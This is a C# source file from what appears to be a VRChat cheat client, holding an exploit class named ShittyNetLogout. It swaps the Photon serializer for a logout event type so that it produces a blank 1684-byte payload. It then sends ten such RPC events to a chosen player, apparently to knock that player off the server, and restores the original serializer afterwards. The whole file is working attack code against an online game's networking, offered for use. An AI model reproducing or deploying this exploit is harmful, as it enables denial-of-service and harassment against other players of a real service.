using ExitGames.Client.Photon;
using Exploits;
using System.Collections;
using System.Linq;
using UnityEngine;
using VRCSDK2;
using Photon.Pun;

#if STEAM
using PhotonNetwork = DKGBGACHCGF;
using PhotonPlayer = MAAMBGJCOKM;
using LogoutType = VRC_EventLog.INGKOGDACII;
#elif OCULUS
using PhotonNetwork = DKGBGACHCGF;
using PhotonPlayer = MAAMBGJCOKM;
using LogoutType = VRC_EventLog.INGKOGDACII;
#endif

namespace NekoClient.Exploits
{
    public class ShittyNetLogout
    {
        private class ShittyNetLogoutInternal : UnityEngine.MonoBehaviour
        {
            public ShittyNetLogoutInternal()
            {
                DontDestroyOnLoad(this);
            }

            private static byte[] SerializeThisFunction(object function)
            {
                var array = new byte[1684];
                return array;
            }

            private IEnumerator Logout()
            {
                Protocol.TypeDict.Remove(typeof(LogoutType));
                Protocol.CodeDict.Remove(102);

#if STEAM
                SerializeMethod serializeMethod = new SerializeMethod(AADBLALKGMG.LDCIBGFMECI);
                DeserializeMethod deserializeMethod = new DeserializeMethod(AADBLALKGMG.JDJKKLNPMNA);
#elif OCULUS
                SerializeMethod serializeMethod = new SerializeMethod(AADBLALKGMG.LDCIBGFMECI);
                DeserializeMethod deserializeMethod = new DeserializeMethod(AADBLALKGMG.JDJKKLNPMNA);
#endif

                PhotonPeer.RegisterType(typeof(LogoutType), (byte)102, new SerializeMethod(SerializeThisFunction), deserializeMethod);

                PhotonView photonView = PhotonView.Get(VRC_EventLog.Instance.Replicator);

                for (int i = 0; i < 10; i++)
                {
                    try
                    {
                        if (Targets[0] != null)
                        {
                            photonView.RpcSecure("ProcessEvent", Targets[0], true, new object[]
                            {
#if STEAM
                                new VRC_EventLog.INGKOGDACII()
#elif OCULUS
                                new VRC_EventLog.INGKOGDACII()
#endif
                            });
                        }
                    }
                    catch { }

                    //yield return new WaitForSeconds(0.0002f);
                }

                Protocol.TypeDict.Remove(typeof(LogoutType));
                Protocol.CodeDict.Remove(102);

                PhotonPeer.RegisterType(typeof(LogoutType), 102, serializeMethod, deserializeMethod);

                yield return new WaitForEndOfFrame();
            }

            public void Trigger()
            {
                StartCoroutine(Logout());
            }

            private PhotonPlayer[] Targets;

            public void SetTarget(PhotonPlayer[] targets)
            {
                Targets = targets;
            }
        }

        private ShittyNetLogoutInternal shittyNetLogout;

        private void InitializeObject()
        {
            GameObject targetObject = new GameObject();
            shittyNetLogout = targetObject.AddComponent<ShittyNetLogoutInternal>();

            UnityEngine.Object.DontDestroyOnLoad(targetObject);
        }

        public ShittyNetLogout(PhotonPlayer target)
        {
            InitializeObject();

            shittyNetLogout.SetTarget(new PhotonPlayer[] { target });
        }

        public void Trigger()
        {
            shittyNetLogout.Trigger();
        }
    }
}